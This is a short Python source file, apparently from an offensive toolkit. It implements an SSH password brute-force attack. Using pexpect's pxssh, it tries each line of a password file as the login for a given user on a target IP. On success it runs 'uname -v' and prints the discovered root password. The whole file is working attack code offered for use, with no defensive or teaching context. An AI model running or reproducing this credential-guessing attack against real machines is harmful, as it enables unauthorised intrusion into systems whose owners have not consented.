import sys
sys.path.append("../../helpers")
sys.path.append("../../models")

from models.targetSSH import SSHTarget
from pexpect import pxssh

from helpers.helpers import TryHardHelpers

class SSHOperations:
    tryHardHelper = TryHardHelpers()

    def connectToTarget(self, targetMachine):
        #targetStatus = super().isAlive() -- Should be declared somewhere else
        targetIp = targetMachine.getTargetIp()
        targetUname = targetMachine.getTargetUname()
        targetPword = targetMachine.getTargetPword()

        try:
            targetConnection = pxssh.pxssh()
            targetConnection.login(targetIp, targetUname, \
                    targetPword)

            print("[+] Connected to " + targetIp)

            # Sends commands to the target
            print(self.sendCommandToTarget(targetConnection, \
                'uname -v').decode("utf-8"))

            return True

        except pxssh.ExceptionPxssh as e:
            print(e)
            print("[-] Failed to connect to " + targetIp)
            print("------------------------------------------" + "\n")

            return False

    def sendCommandToTarget(self, connection, cmd):
        # Sends a command to the specific target
        connection.sendline(cmd)
        connection.prompt()

        return connection.before

    def parseCredentialsForTarget(self, targetIp, user, passwdFile):
        for passwdLine in passwdFile:
            targetMachine = SSHTarget(targetIp, user, passwdLine)
            if self.connectToTarget(targetMachine) == True:
                print("[+] " + targetIp + " root password is " \
                    + passwdLine)
